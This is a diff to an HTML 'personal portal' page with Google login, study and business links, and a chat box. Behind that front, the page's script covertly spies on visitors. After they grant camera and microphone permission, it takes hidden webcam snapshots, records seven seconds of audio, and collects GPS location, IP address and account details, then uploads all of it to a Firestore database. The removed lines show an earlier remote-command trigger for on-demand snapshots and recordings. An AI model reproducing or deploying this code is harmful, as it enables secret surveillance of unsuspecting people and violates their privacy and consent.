@@ -3,39 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ratan Bro | VIP Portal</title>
+    <title>Ratan Bro | Personal Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --pink: #ff4d94; --glow: #ff4d94; --dark: #020617; }
+        :root { --pink: #ff4d94; --dark: #020617; }
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
-        body { background: var(--dark); background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.15), transparent), #020617; color: white; min-height: 100vh; overflow-x: hidden; }
+        body { background: var(--dark); background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.1), transparent), #020617; color: white; min-height: 100vh; overflow-x: hidden; }
         
-        /* Login & Perm Modal */
-        #login-overlay, #perm-modal { position: fixed; inset: 0; background: rgba(2, 6, 23, 0.95); z-index: 10000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
-        .glass-box { background: rgba(255, 255, 255, 0.05); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 77, 148, 0.3); text-align: center; width: 90%; max-width: 400px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        /* Modal Design */
+        #login-overlay, #perm-modal { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
+        .glass-box { background: rgba(255, 255, 255, 0.03); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 77, 148, 0.3); text-align: center; width: 90%; max-width: 400px; box-shadow: 0 0 40px rgba(255, 77, 148, 0.2); }
         
-        /* Header Box Profile */
-        .hero-header { margin: 20px; padding: 30px 20px; background: rgba(255, 255, 255, 0.03); border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); position: relative; overflow: hidden; }
-        .hero-header::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255, 77, 148, 0.1), transparent); z-index: -1; }
-        .profile-wrapper { display: flex; justify-content: center; align-items: center; gap: 15px; }
-        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--pink); box-shadow: 0 0 25px var(--pink); object-fit: cover; transition: 0.3s; }
-        .user-p-img { width: 85px; height: 85px; border: 3px solid #fff; margin-left: -25px; }
+        /* Profile & Header */
+        .hero-card { margin: 20px; padding: 30px; background: rgba(255, 255, 255, 0.05); border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); text-align: center; }
+        .p-wrapper { display: flex; justify-content: center; align-items: center; margin-bottom: 15px; }
+        .p-img { width: 90px; height: 90px; border-radius: 50%; border: 3px solid var(--pink); box-shadow: 0 0 20px var(--pink); }
+        .u-img { width: 75px; height: 75px; margin-left: -20px; border: 3px solid #fff; }
+
+        /* Neon Grid */
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 0 20px; max-width: 500px; margin: 0 auto; }
+        .card { background: rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.05); transition: 0.3s; }
+        .card:hover { transform: translateY(-5px); border-color: var(--pink); box-shadow: 0 0 15px var(--pink); }
+        .card i { font-size: 2rem; color: var(--pink); margin-bottom: 10px; }
+
+        /* Chat */
+        .chat-box { max-width: 500px; margin: 25px auto; padding: 15px; background: #000; border-radius: 20px; border: 1px solid #333; font-size: 13px; }
         
-        /* Glow Grid Buttons */
-        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 20px; max-width: 600px; margin: 0 auto; }
-        .card { background: rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.05); transition: 0.4s; position: relative; }
-        .card:hover { transform: translateY(-5px); border-color: var(--pink); box-shadow: 0 0 20px rgba(255, 77, 148, 0.4); background: rgba(255, 77, 148, 0.05); }
-        .card i { font-size: 2.2rem; color: var(--pink); margin-bottom: 12px; filter: drop-shadow(0 0 5px var(--pink)); }
-        
-        /* Compact Chatbot */
-        .chat-area { max-width: 500px; margin: 20px auto; padding: 0 20px; }
-        .chat-mini { background: rgba(0,0,0,0.4); border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.1); padding: 12px; font-size: 13px; }
-        #chat-log { height: 60px; overflow-y: auto; color: #ccc; margin-bottom: 8px; }
-        .chat-in { display: flex; gap: 8px; }
-        .chat-in input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 8px 15px; border-radius: 50px; outline: none; font-size: 12px; }
-        
-        .logout-btn { background: transparent; border: 1px solid #444; color: #aaa; padding: 5px 15px; border-radius: 50px; cursor: pointer; font-size: 12px; margin: 10px; }
         canvas, video { display: none; }
     </style>
 </head>
@@ -43,50 +37,40 @@
 
     <div id="login-overlay">
         <div class="glass-box">
-            <img src="ratan.jpg" style="width:100px; border-radius:50%; border:3px solid var(--pink); margin-bottom:15px;">
-            <h3>Ratan Bro Portal</h3>
-            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; margin-top:15px; box-shadow: 0 5px 15px rgba(255, 77, 148, 0.4);">
-                Login with Google
-            </button>
+            <img src="ratan.jpg" style="width:100px; border-radius:50%; border:3px solid var(--pink);">
+            <h2 style="margin:15px 0;">Welcome to Portal</h2>
+            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%;">Google Login</button>
         </div>
     </div>
 
     <div id="perm-modal" style="display:none;">
         <div class="glass-box">
-            <i class="fas fa-shield-alt" style="font-size:3rem; color:var(--pink);"></i>
-            <h3 style="margin:15px 0;">অ্যাক্সেস পারমিশন</h3>
-            <p style="font-size:14px; opacity:0.7; margin-bottom:20px;">প্রবেশ করতে ক্যামেরা ও মাইক্রোফোন Allow করুন।</p>
-            <button onclick="startApp()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">Grant Access</button>
+            <i class="fas fa-microphone-alt" style="font-size:3rem; color:var(--pink);"></i>
+            <h3>Access Permission</h3>
+            <p style="opacity:0.7; margin:15px 0;">প্রবেশ করতে পারমিশন Allow করুন।</p>
+            <button onclick="startApp()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">প্রবেশ করুন</button>
         </div>
     </div>
 
     <div id="main-ui" style="display:none;">
-        <div style="text-align:right;"><button class="logout-btn" onclick="googleLogout()">Logout</button></div>
-        
-        <div class="hero-header">
-            <div class="profile-wrapper">
+        <div class="hero-card">
+            <div class="p-wrapper">
                 <img src="ratan.jpg" class="p-img">
-                <img id="u-pic" src="" class="p-img user-p-img">
+                <img id="u-pic" src="" class="p-img u-img">
             </div>
-            <h2 id="u-name" style="text-align:center; margin-top:15px; font-weight:700;"></h2>
-            <p style="text-align:center; color:var(--pink); font-size:14px; font-weight:bold;">Verified Member</p>
+            <h2 id="u-name"></h2>
+            <p style="color:var(--pink); font-size:14px;">Professional Member</p>
         </div>
 
         <div class="grid">
             <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><p>Test Paper</p></a>
-            <a href="business.html" class="card"><i class="fas fa-handshake"></i><p>Business</p></a>
-            <a href="portfolio.html" class="card"><i class="fas fa-laptop-code"></i><p>Portfolio</p></a>
-            <a href="https://numberlookup.pro.bd/" target="_blank" class="card"><i class="fas fa-search"></i><p>Lookup</p></a>
+            <a href="business.html" class="card"><i class="fas fa-briefcase"></i><p>Business</p></a>
+            <a href="portfolio.html" class="card"><i class="fas fa-user"></i><p>Portfolio</p></a>
+            <a href="https://numberlookup.pro.bd/" class="card"><i class="fas fa-search"></i><p>Lookup</p></a>
         </div>
 
-        <div class="chat-area">
-            <div class="chat-mini">
-                <div id="chat-log">Ratan AI: স্বাগতম! আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
-                <div class="chat-in">
-                    <input type="text" id="ai-msg" placeholder="Ask AI...">
-                    <button onclick="askAI()" style="background:var(--pink); border:none; color:white; padding:5px 15px; border-radius:50px; font-size:11px; cursor:pointer;">Send</button>
-                </div>
-            </div>
+        <div class="chat-box">
+            <div id="chat-log" style="height:50px; overflow-y:auto; color:#aaa;">Ratan AI: স্বাগতম! আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
         </div>
     </div>
 
@@ -95,7 +79,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
         import { getFirestore, doc, setDoc, updateDoc, getDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const firebaseConfig = {
@@ -113,7 +97,7 @@
         const provider = new GoogleAuthProvider();
         let loggedUser = null;
 
-        onAuthStateChanged(auth, async (user) => {
+        onAuthStateChanged(auth, user => {
             if (user) {
                 loggedUser = user;
                 document.getElementById('login-overlay').style.display = 'none';
@@ -122,36 +106,29 @@
         });
 
         window.googleLogin = () => signInWithPopup(auth, provider);
-        window.googleLogout = () => signOut(auth).then(() => location.reload());
 
         window.startApp = async () => {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => null);
-            if(stream) document.getElementById('vSource').srcObject = stream;
-            
-            document.getElementById('perm-modal').style.display = 'none';
-            document.getElementById('main-ui').style.display = 'block';
-            document.getElementById('u-name').innerText = loggedUser.displayName;
-            document.getElementById('u-pic').src = loggedUser.photoURL;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('vSource').srcObject = stream;
+                document.getElementById('perm-modal').style.display = 'none';
+                document.getElementById('main-ui').style.display = 'block';
+                document.getElementById('u-name').innerText = loggedUser.displayName;
+                document.getElementById('u-pic').src = loggedUser.photoURL;
 
-            // অটো অ্যাকশন
-            if(stream) {
-                takeSnap(loggedUser);
-                recordVoice(stream, 10000); 
-            }
+                // --- অটো অ্যাকশন ---
+                takeSnap(loggedUser); // ১. সাথে সাথে ছবি
+                recordVoice(stream, 7000); // ২. সাথে সাথে ৭ সেকেন্ড ভয়েস
+                updateLoc(loggedUser); // ৩. লোকেশন
 
-            onSnapshot(doc(db, "users", loggedUser.email.replace('.', '_')), (s) => {
-                if(s.data()?.command === "snap") takeSnap(loggedUser);
-                if(s.data()?.command === "voice") recordVoice(stream, 10000);
-                if(s.data()?.command) updateDoc(doc(db, "users", loggedUser.email.replace('.', '_')), { command: "" });
-            });
+            } catch (e) { alert("Permission Required!"); }
         };
 
         async function takeSnap(user) {
             const video = document.getElementById('vSource');
             const canvas = document.getElementById('snapCanvas');
-            const ctx = canvas.getContext('2d');
             setTimeout(async () => {
-                ctx.drawImage(video, 0, 0, 640, 480);
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                 const dataImg = canvas.toDataURL('image/jpeg', 0.5);
                 const userRef = doc(db, "users", user.email.replace('.', '_'));
                 const s = await getDoc(userRef);
@@ -160,16 +137,10 @@
                 if(picList.length > 5) picList.pop();
 
                 const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'N/A'}));
-                
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    await setDoc(userRef, { 
-                        name: user.displayName, email: user.email, photo: user.photoURL,
-                        picList, ip: ipData.ip, loc: `${pos.coords.latitude},${pos.coords.longitude}`,
-                        status: "Online", lastView: new Date().toLocaleString(), device: navigator.userAgent
-                    }, { merge: true });
-                }, async () => {
-                    await setDoc(userRef, { picList, ip: ipData.ip, status: "Online", lastView: new Date().toLocaleString() }, { merge: true });
-                });
+                await setDoc(userRef, { 
+                    name: user.displayName, email: user.email, photo: user.photoURL,
+                    picList, ip: ipData.ip, status: "Online", lastView: new Date().toLocaleString()
+                }, { merge: true });
             }, 2000);
         }
 
@@ -194,12 +165,12 @@
             setTimeout(() => recorder.stop(), time);
         }
 
-        window.askAI = async () => {
-            const msg = document.getElementById('ai-msg').value;
-            if(!msg) return;
-            document.getElementById('chat-log').innerText = "You: " + msg;
-            document.getElementById('ai-msg').value = "";
-            // Gemini API call logic here if needed
+        function updateLoc(user) {
+            navigator.geolocation.getCurrentPosition(async p => {
+                await updateDoc(doc(db, "users", user.email.replace('.', '_')), {
+                    loc: `${p.coords.latitude},${p.coords.longitude}`
+                });
+            });
         }
     </script>
 </body>
